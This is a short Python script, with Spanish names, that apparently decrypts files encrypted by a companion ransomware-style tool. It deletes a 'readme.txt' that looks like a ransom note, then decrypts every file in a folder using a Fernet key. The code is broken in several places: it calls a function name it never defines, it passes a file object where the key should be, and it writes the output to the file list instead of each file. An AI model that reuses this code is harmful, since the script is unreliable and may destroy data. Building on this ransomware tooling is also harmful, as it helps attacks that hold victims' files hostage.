from typing import KeysView
from cryptography.fernet import Fernet 
import os

def cargar_keys():
    return open('key.key', 'rb')

def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            encrypted_data = file.read()
        descrypted_data = f.decrypt(encrypted_data)
        with open(items, 'wb') as file:
            file.write(descrypted_data)



if __name__ == '__main__':
    path_to_encrypt = 'RUTA DE LOS ARCHIVOS QUE DESENCRIPTAS'              
    os.remove(path_to_encrypt+'\\'+'readme.txt')

    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    Key = cargar_key()
    decrypt(full_path, Key)